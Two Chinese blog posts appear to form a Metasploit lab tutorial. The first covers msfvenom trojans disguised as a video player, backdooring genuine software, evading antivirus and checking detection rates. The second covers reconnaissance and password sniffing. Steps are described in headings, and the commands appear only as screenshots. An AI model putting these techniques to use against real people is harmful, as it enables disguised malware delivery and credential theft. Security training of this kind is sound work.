<h2 id="二、制作Windows恶意软件获取shell"><a href="#二、制作Windows恶意软件获取shell" class="headerlink" title="二、制作Windows恶意软件获取shell"></a>二、制作Windows恶意软件获取shell</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201337098.png" alt="image-20210816201337098"></p>
<h3 id="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"><a href="#实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马" class="headerlink" title="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"></a>实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201528885.png" alt="image-20210816201528885"></p>
<h3 id="2-1生成西瓜影音-exe后门程序"><a href="#2-1生成西瓜影音-exe后门程序" class="headerlink" title="2.1生成西瓜影音.exe后门程序"></a>2.1生成西瓜影音.exe后门程序</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201708965.png" alt="image-20210816201708965"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201745558.png" alt="image-20210816201745558"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201820472.png" alt="image-20210816201820472"></p>
<p>环境：kali、win7（靶机）</p>
<h4 id="步骤1：生成后门程序并启动服务器"><a href="#步骤1：生成后门程序并启动服务器" class="headerlink" title="步骤1：生成后门程序并启动服务器"></a>步骤1：生成后门程序并启动服务器</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201959791.png" alt="image-20210816201959791"></p>
<h4 id="步骤2：在MSF上启动handler开始监听后门程序"><a href="#步骤2：在MSF上启动handler开始监听后门程序" class="headerlink" title="步骤2：在MSF上启动handler开始监听后门程序"></a>步骤2：在MSF上启动handler开始监听后门程序</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203201351.png" alt="image-20210816203201351"></p>
<p>启动msf</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203308925.png" alt="image-20210816203308925"></p>
<p>加载hander模块</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203337202.png" alt="image-20210816203337202"></p>
<p>配置payload</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203450238.png" alt="image-20210816203450238"></p>
<p>查看并配置参数、启动</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203609271.png" alt="image-20210816203609271"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203656900.png" alt="image-20210816203656900"></p>
<p>补充：启动后就在监听了</p>
<h4 id="步骤3：win7下载木马文件并运行"><a href="#步骤3：win7下载木马文件并运行" class="headerlink" title="步骤3：win7下载木马文件并运行"></a>步骤3：win7下载木马文件并运行</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202231441.png" alt="image-20210816202231441"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202251261.png" alt="image-20210816202251261"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203759663.png" alt="image-20210816203759663"></p>
<h4 id="步骤4：查看结果并提升权限"><a href="#步骤4：查看结果并提升权限" class="headerlink" title="步骤4：查看结果并提升权限"></a>步骤4：查看结果并提升权限</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203911048.png" alt="image-20210816203911048"></h4><p>查看权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204025799.png" alt="image-20210816204025799"></p>
<p>提升权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204236941.png" alt="image-20210816204236941"></p>
<p>其他操作</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204419164.png" alt="image-20210816204419164"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204435891.png" alt="image-20210816204435891"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204609219.png" alt="image-20210816204609219"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204637881.png" alt="image-20210816204637881"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204731011.png" alt="image-20210816204731011"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204847203.png" alt="image-20210816204847203"></p>
<p>补充：软件病毒/木马等扫描网站</p>
<p>1.可以把程序/软件会被那些杀毒软件扫描出来</p>
<p>2.可以检测自己制作的木马可以避开率</p>
<p>扫描网站1：<a target="_blank" rel="noopener" href="https://www.virscan.org/">https://www.virscan.org/</a></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202542969.png" alt="image-20210816202542969"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202732647.png" alt="image-20210816202732647"></p>
<p>扫描网站2：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202846223.png" alt="image-20210816202846223"></p>
<h3 id="2-2模拟黑客给真正的软件加上后门"><a href="#2-2模拟黑客给真正的软件加上后门" class="headerlink" title="2.2模拟黑客给真正的软件加上后门"></a>2.2模拟黑客给真正的软件加上后门</h3><h4 id="步骤1：下载正版软件并安装上后门"><a href="#步骤1：下载正版软件并安装上后门" class="headerlink" title="步骤1：下载正版软件并安装上后门"></a>步骤1：下载正版软件并安装上后门</h4><p>下载程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205146217.png" alt="image-20210816205146217"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205214862.png" alt="image-20210816205214862"></p>
<p>查找要安装后门的程序（副程序：主程序启动会带动其启动）</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205633896.png" alt="image-20210816205633896"></p>
<h4 id="步骤2：把副程序复制到kali进行安装后门"><a href="#步骤2：把副程序复制到kali进行安装后门" class="headerlink" title="步骤2：把副程序复制到kali进行安装后门"></a>步骤2：把副程序复制到kali进行安装后门</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205914655.png" alt="image-20210816205914655"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205939315.png" alt="image-20210816205939315"></p>
<p>安装后门</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210009776.png" alt="image-20210816210009776"></p>
<p>win7下载安装了后门的程序并替换正版的程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210157882.png" alt="image-20210816210157882"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210214266.png" alt="image-20210816210214266"></p>
<p>步骤3：启动</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210303111.png" alt="image-20210816210303111"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210315008.png" alt="image-20210816210315008"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210349331.png" alt="image-20210816210349331"></p>
<p>回到win7启动软件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210438619.png" alt="image-20210816210438619"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210512609.png" alt="image-20210816210512609"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210616482.png" alt="image-20210816210616482"></p>
<h3 id="2-3-使用metasploit的evasion模块生成后门木马"><a href="#2-3-使用metasploit的evasion模块生成后门木马" class="headerlink" title="2.3 使用metasploit的evasion模块生成后门木马"></a>2.3 使用metasploit的evasion模块生成后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210719911.png" alt="image-20210816210719911"></p>
<h4 id="步骤1：查找并加载模块"><a href="#步骤1：查找并加载模块" class="headerlink" title="步骤1：查找并加载模块"></a>步骤1：查找并加载模块</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210803467.png" alt="image-20210816210803467"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210832486.png" alt="image-20210816210832486"></p>
<h4 id="步骤2：修改木马文件名称（可以不修改）"><a href="#步骤2：修改木马文件名称（可以不修改）" class="headerlink" title="步骤2：修改木马文件名称（可以不修改）"></a>步骤2：修改木马文件名称（可以不修改）</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210936108.png" alt="image-20210816210936108"></p>
<h4 id="步骤3：设置payload"><a href="#步骤3：设置payload" class="headerlink" title="步骤3：设置payload"></a>步骤3：设置payload</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211013243.png" alt="image-20210816211013243"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211051718.png" alt="image-20210816211051718"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211129141.png" alt="image-20210816211129141"></p>
<p>启动生成文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211209466.png" alt="image-20210816211209466"></p>
<p>补充：上传文件，方便win7下载（也可以直接复制）</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211330054.png" alt="image-20210816211330054"></p>
<h4 id="步骤4：监听"><a href="#步骤4：监听" class="headerlink" title="步骤4：监听"></a>步骤4：监听</h4><p>渗透：加载模块、配置参数</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211521609.png" alt="image-20210816211521609"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211559689.png" alt="image-20210816211559689"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211611575.png" alt="image-20210816211611575"></p>
<h4 id="步骤5：win7启动木马文件"><a href="#步骤5：win7启动木马文件" class="headerlink" title="步骤5：win7启动木马文件"></a>步骤5：win7启动木马文件</h4><p>下载文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211648937.png" alt="image-20210816211648937"></p>
<p>启动木马文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211730407.png" alt="image-20210816211730407"></p>
<p>kali查看结果</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211810550.png" alt="image-20210816211810550"></p>
<h2 id="三、制作Linux恶意软件获取shell"><a href="#三、制作Linux恶意软件获取shell" class="headerlink" title="三、制作Linux恶意软件获取shell"></a>三、制作Linux恶意软件获取shell</h2><p><strong>步骤1：使用msfvenom生成linux可执行文件，再开启apache服务</strong></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102634654.png" alt="image-20210817102634654"></p>
<p>补充：这里的恶意文件是放在根目录下的，所以linux下载直接是ip地址+</p>
<p><strong>步骤2：linux系统下载恶意文件</strong></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102923861.png" alt="image-20210817102923861"></p>
<p>此时文件是不可执行的，所以要提升权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103147429.png" alt="image-20210817103147429"></p>
<p>步骤3：设置linux的payload并</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103256476.png" alt="image-20210817103256476"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103309884.png" alt="image-20210817103309884"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103341812.png" alt="image-20210817103341812"></p>
<p>步骤4：linux启动程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103420606.png" alt="image-20210817103420606"></p>
<p>步骤5：查看结果与操作</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103501914.png" alt="image-20210817103501914"></p>
<p>查看当前目录</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103601631.png" alt="image-20210817103601631"></p>
<p>查看身份权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103644708.png" alt="image-20210817103644708"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">Metasploit渗透测试之信息收集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-16 15:31:50 / 修改时间：15:32:29" itemprop="dateCreated datePublished" datetime="2021-08-16T15:31:50+08:00">2021-08-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Metasploit渗透测试之信息收集"><a href="#Metasploit渗透测试之信息收集" class="headerlink" title="Metasploit渗透测试之信息收集"></a>Metasploit渗透测试之信息收集</h1><h2 id="一、基于TCP协议收集主机信息"><a href="#一、基于TCP协议收集主机信息" class="headerlink" title="一、基于TCP协议收集主机信息"></a>一、基于TCP协议收集主机信息</h2><h4 id="1-1使用Metasploit中的nmap和arp-sweep收集主机信息"><a href="#1-1使用Metasploit中的nmap和arp-sweep收集主机信息" class="headerlink" title="1.1使用Metasploit中的nmap和arp_sweep收集主机信息"></a>1.1使用Metasploit中的nmap和arp_sweep收集主机信息</h4><p>步骤1：扫描网关/主机，查看端口开放信息</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102105986.png" alt="image-20210815102105986"></p>
<p>步骤2：查看arp_sweep的模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102341061.png" alt="image-20210815102341061"></p>
<p>步骤3：加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102415059.png" alt="image-20210815102415059"></p>
<p>步骤4：查看模块信息并配置/修改的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815102452764.png" alt="image-20210815102452764"></p>
<p>补充：Required为yes的都要配置，其他的可以修改</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103032904.png" alt="image-20210815103032904"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103253012.png" alt="image-20210815103253012"></p>
<p>启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103322461.png" alt="image-20210815103322461"></p>
<h4 id="1-2使用半连接方式（SYN扫描）扫描TCP端口"><a href="#1-2使用半连接方式（SYN扫描）扫描TCP端口" class="headerlink" title="1.2使用半连接方式（SYN扫描）扫描TCP端口"></a>1.2使用半连接方式（SYN扫描）扫描TCP端口</h4><p>步骤1：查找端口扫描模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103729230.png" alt="image-20210815103729230"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103804503.png" alt="image-20210815103804503"></p>
<p>步骤2：加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815103838738.png" alt="image-20210815103838738"></p>
<p>步骤3：查看模块信息并配置/修改的参数</p>
<p>查看模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104240573.png" alt="image-20210815104240573"></p>
<p>设置目标网络</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104326881.png" alt="image-20210815104326881"></p>
<p>修改端口（这里太多了）</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104355465.png" alt="image-20210815104355465"></p>
<p>修改进程数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104422751.png" alt="image-20210815104422751"></p>
<p>启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104444121.png" alt="image-20210815104444121"></p>
<h4 id="1-3使用auxiliary-sniffer下的psnuffle模块进行密码嗅探"><a href="#1-3使用auxiliary-sniffer下的psnuffle模块进行密码嗅探" class="headerlink" title="1.3使用auxiliary/sniffer下的psnuffle模块进行密码嗅探"></a>1.3使用auxiliary/sniffer下的psnuffle模块进行密码嗅探</h4><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104605620.png" alt="image-20210815104605620"></p>
<p>步骤1：查看/加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104734782.png" alt="image-20210815104734782"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104826980.png" alt="image-20210815104826980"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815104842936.png" alt="image-20210815104842936"></p>
<p>也可以用show options命令，info命令查看的更详细。可以看到这里没有一定需要配置的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105009796.png" alt="image-20210815105009796"></p>
<p>步骤2：启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105102605.png" alt="image-20210815105102605"></p>
<p>步骤3：打开另外一个终端进行登录测试/也可以在靶机登录</p>
<p>如果没有lftp模块，则需要安装（-u 后面的是账号名msfadmin）</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105223686.png" alt="image-20210815105223686"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105458038.png" alt="image-20210815105458038"></p>
<p>步骤4：查看</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105547055.png" alt="image-20210815105547055"></p>
<p>补充：进程会一直在后台嗅探（按了ctrl+c也不行）</p>
<p>查看和结束进程</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815105851420.png" alt="image-20210815105851420"></p>
<h2 id="二、-基于SNMP协议收集主机信息"><a href="#二、-基于SNMP协议收集主机信息" class="headerlink" title="二、 基于SNMP协议收集主机信息"></a>二、 基于SNMP协议收集主机信息</h2><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110053572.png" alt="image-20210815110053572"></p>
<p>步骤1：修改Metaspolittable2-Linux主机上的SNMP服务</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110153260.png" alt="image-20210815110153260"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110444356.png" alt="image-20210815110444356"></p>
<p>补充：修改为对外开放，这里是设置了对外所有主机开放</p>
<p>确认服务开启情况（SNMP服务是在161端口上的）</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110626352.png" alt="image-20210815110626352"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110659381.png" alt="image-20210815110659381"></p>
<p>步骤2：查找并加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110849325.png" alt="image-20210815110849325"></p>
<p>步骤3：查看模块信息并配置/修改的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815110944075.png" alt="image-20210815110944075"></p>
<p>步骤4：启动和查看信息</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815111026777.png" alt="image-20210815111026777"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815111103943.png" alt="image-20210815111103943"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815111151128.png" alt="image-20210815111151128"></p>
<p>补充：（信息太多，上面信息截图不全）可以查看到物理机信息、ip地址、网关、MAC地址、端口信息、进程等等。其中服务器硬件信息和服务器当前运行的进程这两方面是其他扫描方式获取不到的。</p>
<h2 id="三、-基于SMB协议收集信息"><a href="#三、-基于SMB协议收集信息" class="headerlink" title="三、 基于SMB协议收集信息"></a>三、 基于SMB协议收集信息</h2><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815151539221.png" alt="image-20210815151539221"></p>
